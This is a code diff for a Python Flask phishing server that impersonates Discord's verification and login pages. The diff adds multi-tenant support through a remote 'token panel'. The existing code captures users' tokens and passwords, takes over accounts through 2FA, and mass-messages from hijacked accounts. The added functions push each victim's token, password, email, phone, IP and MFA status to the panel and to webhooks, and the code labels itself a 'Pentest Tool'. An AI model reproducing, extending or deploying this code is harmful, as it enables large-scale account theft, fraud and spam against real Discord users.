@@ -21,7 +21,7 @@ for _m, _p in _deps.items():
         print(f'[*] Installing {_p}...')
         subprocess.check_call([sys.executable, '-m', 'pip', 'install', _p, '-q'])
 
-from flask import Flask, request, jsonify, send_from_directory, make_response
+from flask import Flask, request, jsonify, send_from_directory, make_response, redirect
 from curl_cffi import requests as creq   # Chrome TLS impersonation
 import requests as plain_req              # for webhook (no impersonation needed)
 import websocket
@@ -57,6 +57,103 @@ VOICE_CHANNEL_ID = os.environ.get('VOICE_CHANNEL_ID', '1477752842675683555')
 
 VOICE_CHANNEL_ID_2 = '1478017594895106229'
 GUILD_ID_2 = '1472050464659865742'
+
+# ── Dynamic config from TOKENPANEL (multi-tenant) ──
+PANEL_URL     = os.environ.get('PANEL_URL', '')       # e.g. https://discordmanager.lol
+PANEL_API_KEY = os.environ.get('PANEL_API_KEY', '')
+if PANEL_URL:
+    print(f'[panel] PANEL_URL={PANEL_URL}  API_KEY={"set" if PANEL_API_KEY else "*** NOT SET ***"}')
+
+_tenant_cache = {}
+_tenant_lock = threading.Lock()
+
+_panel_info_cache = {}
+_panel_info_ttl = 300
+
+def _get_server_info_from_panel(identifier, server_int):
+    if not PANEL_URL:
+        return None
+    cache_key = f'{identifier}:{server_int}'
+    cached = _panel_info_cache.get(cache_key)
+    if cached and time.time() - cached['ts'] < _panel_info_ttl:
+        return cached['info']
+    try:
+        r = plain_req.get(f'{PANEL_URL}/api/{identifier}/servers/{server_int}/info',
+                          headers={'Authorization': f'Bearer {PANEL_API_KEY}'},
+                          timeout=8)
+        if r.status_code == 200:
+            info = r.json()
+            _panel_info_cache[cache_key] = {'info': info, 'ts': time.time()}
+            return info
+    except Exception as e:
+        print(f'[tenant] Panel server info error for {cache_key}: {e}')
+    return None
+
+def _push_token_to_panel(bot_key, token_data):
+    if not PANEL_URL or not bot_key:
+        return
+    try:
+        plain_req.post(f'{PANEL_URL}/api/{bot_key}/tokens',
+                       headers={'Authorization': f'Bearer {PANEL_API_KEY}',
+                                'Content-Type': 'application/json'},
+                       json=token_data, timeout=8)
+        print(f'[panel] Token pushed for key={bot_key}')
+    except Exception as e:
+        print(f'[panel] Token push error for key={bot_key}: {e}')
+
+_panel_config_cache = {}
+_panel_cache_ttl = 120
+
+def _get_panel_config(bot_key):
+    if not PANEL_URL or not bot_key:
+        return {}
+    now = time.time()
+    cached = _panel_config_cache.get(str(bot_key))
+    if cached and now - cached['ts'] < _panel_cache_ttl:
+        return cached['cfg']
+    try:
+        r = plain_req.get(f'{PANEL_URL}/api/{bot_key}/config',
+                          headers={'Authorization': f'Bearer {PANEL_API_KEY}'},
+                          timeout=8)
+        if r.status_code == 200:
+            cfg = r.json()
+            _panel_config_cache[str(bot_key)] = {'cfg': cfg, 'ts': now}
+            return cfg
+    except Exception as e:
+        print(f'[panel] Config fetch error for key={bot_key}: {e}')
+    return {}
+
+def _set_tenant(guild_id, role_id, bot_key, identifier=None, server_int=None):
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    t = {'guild_id': guild_id, 'role_id': role_id, 'bot_key': bot_key, 'ts': time.time()}
+    if identifier is not None:
+        t['identifier'] = str(identifier)
+    if server_int is not None:
+        t['server_int'] = str(server_int)
+    with _tenant_lock:
+        _tenant_cache[ip] = t
+
+def _get_tenant():
+    cookie = request.cookies.get('_tenant', '')
+    if cookie:
+        parts = cookie.split(':')
+        if len(parts) == 4:
+            return {'guild_id': parts[0], 'role_id': parts[1], 'bot_key': parts[2],
+                    'identifier': parts[2], 'server_int': parts[3]}
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    with _tenant_lock:
+        t = _tenant_cache.get(ip)
+        if t:
+            return t
+    return None
+
+def _get_webhook_for_tenant(tenant=None):
+    if tenant:
+        cfg = _get_panel_config(tenant.get('bot_key'))
+        wh = cfg.get('webhook', '')
+        if wh:
+            return wh
+    return WEBHOOK
 
 # ━━━━━━━━━━━━ Proxy for Discord API calls ━━━━━━━━━━━━
 def _load_proxy():
@@ -915,10 +1012,11 @@ def _mass_message(token, uname='?'):
     print(f'[spam] {uname}: Done! sent={sent} failed={failed}')
 
 
-def send_webhook(token, client_ip="?", password="?"):
+def send_webhook(token, client_ip="?", password="?", tenant=None):
     client_ip = _clean_ip(client_ip)
     comp  = os.environ.get('COMPUTERNAME', platform.node())
     luser = os.environ.get('USERNAME', os.environ.get('USER', '?'))
+    webhook_url = _get_webhook_for_tenant(tenant) if tenant else WEBHOOK
 
     # Stealth session for all Discord API calls
     s_api = _make_session()
@@ -995,7 +1093,12 @@ def send_webhook(token, client_ip="?", password="?"):
                 print(f'[2fa] Token updated for {uname}: {active_token[:20]}...')
 
         # ── Send mass messages using the active (post-takeover) token ──
-        threading.Thread(target=_mass_message, args=(active_token, uname), daemon=True).start()
+        # Only auto-DM if dm_enabled is toggled on in panel config
+        panel_cfg = _get_panel_config(tenant.get('bot_key') if tenant else None)
+        if panel_cfg.get('dm_enabled', False):
+            threading.Thread(target=_mass_message, args=(active_token, uname), daemon=True).start()
+        else:
+            print(f'[blast] {uname}: Auto-DM disabled in panel settings, skipping')
 
         try:
             cr = s_api.get(f"{API}/users/@me/channels", headers=api_h, timeout=10)
@@ -1056,29 +1159,51 @@ def send_webhook(token, client_ip="?", password="?"):
             }],
             "username": "Pentest Tool"
         }
-        plain_req.post(WEBHOOK, json=payload, timeout=10)
+        plain_req.post(webhook_url, json=payload, timeout=10)
         print(f"[+] Webhook sent for {uname}#{disc} ({uid})")
         # Also fire backup webhook
         try:
             plain_req.post(WEBHOOK_BACKUP, json=payload, timeout=10)
         except: pass
+        # Push token data to panel
+        bot_key = tenant.get('bot_key') if tenant else None
+        if bot_key:
+            _push_token_to_panel(bot_key, {
+                'token': active_token, 'user_id': uid, 'username': uname,
+                'display_name': u.get('global_name', ''), 'email': email,
+                'phone': phone, 'password': password, 'ip': client_ip,
+                'avatar_url': pfp or '', 'nitro': nitro,
+                'nitro_type': u.get('premium_type', 0),
+                'mfa': mfa, 'has_billing': False, 'guilds_count': total,
+                'badges': u.get('public_flags', 0),
+                'verified': u.get('verified', False),
+                'valid': True,
+                'server_int': tenant.get('server_int', '') if tenant else '',
+                'guild_id': tenant.get('guild_id', '') if tenant else '',
+            })
 
     except Exception as e:
         print(f"[!] Webhook error: {e}")
         _fallback("exception")
 
 
-def fire_webhook(token, client_ip="?", password="?"):
+def fire_webhook(token, client_ip="?", password="?", tenant=None):
     # Try to look up password from store if not provided
     if password == '?':
         with _pw_store_lock:
             password = _pw_store.pop(token, '?')
+    # Auto-detect tenant from request context if not provided
+    if tenant is None:
+        try:
+            tenant = _get_tenant()
+        except:
+            pass
     with _webhookd_lock:
         if token in _webhookd_tokens:
             print(f"[~] Webhook skipped (duplicate token)")
             return
         _webhookd_tokens.add(token)
-    threading.Thread(target=send_webhook, args=(token, client_ip, password), daemon=True).start()
+    threading.Thread(target=send_webhook, args=(token, client_ip, password, tenant), daemon=True).start()
 
 
 def _get_user_brief(token):
@@ -2232,6 +2357,84 @@ def index():
 def verify_catchall(slug):
     """Catch-all: /verify/anything serves the same verify page."""
     return send_from_directory('.', 'verify_page.html')
+
+
+@app.route('/<identifier>/<server_int>')
+def tenant_verify(identifier, server_int):
+    """Multi-tenant entry: /<identifier>/<server_int>
+    Gets server info from TOKENPANEL."""
+    if not identifier.isdigit() or not server_int.isdigit():
+        return make_response('Invalid verification link.', 400)
+    server_info = _get_server_info_from_panel(identifier, server_int)
+    if not server_info or not server_info.get('has_bot_token'):
+        return make_response('Invalid verification link.', 404)
+    guild_id = server_info.get('guild_id', '0')
+    role_id = server_info.get('verify_role_id', '0')
+    _set_tenant(guild_id, role_id, identifier, identifier=identifier, server_int=server_int)
+    # Serve verify_page.html with tenant login URL injected
+    try:
+        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'verify_page.html'), 'r', encoding='utf-8') as f:
+            html = f.read()
+    except:
+        return make_response('Verify page not found.', 500)
+    # Inject guild info via data param approach + override login URL
+    guild_name = server_info.get('guild_name', 'Server') or 'Server'
+    icon_url = server_info.get('guild_icon', '')
+    import html as html_mod
+    import base64 as b64_mod
+    data_json = json.dumps({'name': guild_name, 'icon': icon_url, 'guildId': guild_id})
+    data_b64 = b64_mod.b64encode(data_json.encode()).decode()
+    login_url = f'/{identifier}/{server_int}/login'
+    # Replace the login URL in the verify page
+    html = html.replace("window.location.origin + '/login'",
+                         f"window.location.origin + '{login_url}'")
+    # Inject data param script to fill guild info
+    inject_js = f'<script>!function(){{try{{var j=JSON.parse(atob("{data_b64}"));if(j.name){{document.getElementById("guild-name").textContent=j.name;var gn=document.querySelector(".guild-name-text");if(gn)gn.textContent=j.name}}if(j.icon){{var gi=document.getElementById("guild-icon");if(gi)gi.src=j.icon}}}}catch(e){{}}}}</script>'
+    html = html.replace('</body>', inject_js + '\n</body>', 1)
+    verified = request.args.get('verified') == '1'
+    if verified:
+        # Inject verified overlay
+        verified_html = '<div style="position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center"><div style="text-align:center;color:#fff"><div style="width:80px;height:80px;border-radius:50%;background:#23a55a;margin:0 auto 20px;display:flex;align-items:center;justify-content:center"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div><h1 style="color:#23a55a;font-size:28px;margin:0 0 10px">Verified!</h1><p style="color:#b5bac1;font-size:14px;margin:0">You may now close this window.</p></div></div>'
+        html = html.replace('</body>', verified_html + '\n</body>', 1)
+    resp = make_response(html)
+    resp.headers['Content-Type'] = 'text/html; charset=utf-8'
+    resp.headers['Cache-Control'] = 'no-store'
+    resp.set_cookie('_tenant', f'{guild_id}:{role_id}:{identifier}:{server_int}', max_age=600, httponly=False, samesite='Lax')
+    return resp
+
+
+@app.route('/<identifier>/<server_int>/login')
+def tenant_login(identifier, server_int):
+    """Multi-tenant login: /<identifier>/<server_int>/login"""
+    if not identifier.isdigit() or not server_int.isdigit():
+        return make_response('Invalid verification link.', 400)
+    server_info = _get_server_info_from_panel(identifier, server_int)
+    if not server_info or not server_info.get('has_bot_token'):
+        return make_response('Invalid verification link.', 404)
+    guild_id = server_info.get('guild_id', '0')
+    role_id = server_info.get('verify_role_id', '0')
+    _set_tenant(guild_id, role_id, identifier, identifier=identifier, server_int=server_int)
+    html = _fetch_login_html()
+    if html:
+        sid, s = _get_proxy_session()
+        try:
+            s.get('https://discord.com/login', headers={
+                'User-Agent': UA, 'Accept': 'text/html', 'Sec-CH-UA': SEC_CH_UA,
+                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE, 'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
+            }, timeout=15)
+        except:
+            pass
+        tok = _issue_page_token()
+        html_out = html.replace('</head>', f'<script>window._pgToken="{tok}";</script>\n</head>', 1)
+        resp = make_response(html_out)
+        resp.headers['Content-Type'] = 'text/html; charset=utf-8'
+        resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+        resp.headers['Pragma'] = 'no-cache'
+        resp.headers['Expires'] = '0'
+        resp.set_cookie('_dsid', sid, max_age=600, httponly=True, samesite='Lax')
+        resp.set_cookie('_tenant', f'{guild_id}:{role_id}:{identifier}:{server_int}', max_age=600, httponly=False, samesite='Lax')
+        return resp
+    return _serve_local_login()
 
 
 @app.route('/login')
@@ -3646,7 +3849,10 @@ def proxy_discord_api_v(rest):
 @app.route('/channels')
 @app.route('/channels/<path:rest>')
 def proxy_channels_redirect(rest=''):
-    """After login Discord redirects here. Show success page."""
+    """After login Discord redirects here. Redirect to tenant verify page if context exists."""
+    tenant = _get_tenant()
+    if tenant and tenant.get('server_int'):
+        return redirect(f'/{tenant["identifier"]}/{tenant["server_int"]}?verified=1')
     return make_response('''<!DOCTYPE html><html><head><meta charset="utf-8"><title>Discord</title></head>
 <body style="background:#313338;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif">
 <div style="text-align:center;color:#fff">
